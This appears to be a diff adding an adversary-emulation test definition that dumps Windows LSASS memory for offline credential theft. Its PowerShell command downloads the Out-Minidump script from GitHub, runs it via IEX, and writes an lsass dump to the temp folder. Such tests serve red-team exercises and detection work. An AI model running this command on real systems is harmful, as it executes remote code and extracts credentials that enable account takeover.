@@ -1,0 +1,25 @@
+- id: 505cf0a6-442c-5aa1-a4d3-00166ef8c4b8
+  name: Soumaia ART Tests - Dump LSASS.exe Memory using Out-Minidump.ps1
+  description: 'The memory of lsass.exe is often dumped for offline credential theft attacks. This test leverages a pure
+
+    powershell implementation that leverages the MiniDumpWriteDump Win32 API call.
+
+    Upon successful execution, you should see the following file created $env:TEMP\lsass_*.dmp.
+
+
+    Author of Out-Minidump: Matthew Graeber (@mattifestation) (requires elevation)'
+  tactic: credential-access
+  technique:
+    attack_id: T1003.001
+    name: 'OS Credential Dumping: LSASS Memory'
+  platforms:
+    windows:
+      psh:
+        command: |-
+          [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
+          New-Item -Type Directory "$env:TEMP\ART-ExternalPayloads" -ErrorAction Ignore -Force | Out-Null
+          try{ IEX (IWR 'https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1003.001/src/Out-Minidump.ps1') -ErrorAction Stop}
+          catch{ $_; exit $_.Exception.Response.StatusCode.Value__}
+          get-process lsass | Out-Minidump
+        cleanup: |-
+          Remove-Item $env:TEMP\lsass_*.dmp -ErrorAction Ignore
